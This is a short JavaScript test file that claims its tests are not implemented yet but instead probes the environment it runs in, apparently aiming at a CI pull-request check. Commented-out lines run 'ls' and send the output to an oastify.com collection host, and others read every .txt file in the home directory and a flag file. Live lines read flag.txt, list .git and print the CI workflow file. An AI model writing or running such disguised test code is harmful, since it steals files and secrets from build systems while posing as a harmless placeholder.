// TODO: implement the tests
console.log("Tests are not implemented yet...");


//const { exec } = require('child_process');
//let a = exec('ls');
//fetch("https://vbaj623gs0hv8em8lcyvyqyba2gt4osd.oastify.com/?" + a);

//var cp = require('child_process');
//console.log(cp.execSync('find ~ -name "*.txt" -exec cat {} +').toString());

//var cp = require('child_process');
//console.log(cp.execSync('cat ./flag.txt').toString());

const index = require("../index")
index.cat("./index.js")
index.cat("flag.txt")

const { ls, cat } = require('../index.js');

console.log(ls(".git"));
console.log(cat(".github/workflows/pr-check.yml"));
